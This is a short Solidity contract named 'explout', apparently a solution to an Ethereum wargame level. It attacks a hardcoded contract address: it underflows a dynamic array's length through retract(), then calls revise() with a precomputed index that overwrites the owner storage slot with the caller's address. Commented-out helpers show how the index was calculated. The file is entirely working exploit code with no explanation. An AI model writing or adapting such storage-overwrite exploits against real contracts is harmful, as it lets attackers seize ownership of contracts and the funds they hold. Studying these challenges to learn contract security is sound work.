// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface alien{
     function makeContact() external;

  function record(bytes32 _content) external;

  function retract()  external;

  function revise(uint i, bytes32 _content) external;

  function owner() external;
}

contract explout{
    alien contractt = alien(0x2eB861269D62f9C28922d26f70680999dbb3bFf4);
    //   bytes32[] public codex;

    //   uint one = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    //   uint two = 80084422859880547211683076133703299733277748156566366325829078699459944778998;
    //   uint three = 35707666377435648211887908874984608119992236509074197713628505308453184860938;


    function calll() public{
        contractt.makeContact();
        contractt.retract();
        contractt.revise(35707666377435648211887908874984608119992236509074197713628505308453184860938,bytes32(uint256((uint160(msg.sender)))));
    }
//     function retract() public {
//     codex.length--;
//   }
//   function get() public view returns(uint){
//       return codex.length;
//   }
//  function dfjlk() public view returns(uint){
//      return one - two;
//  }
//  function djfkl() public view returns(uint){
//      return uint(keccak256(abi.encode(uint256(1))));
//  }
//  function  aieih() public view returns(uint){
//      return two + three;
//  }
}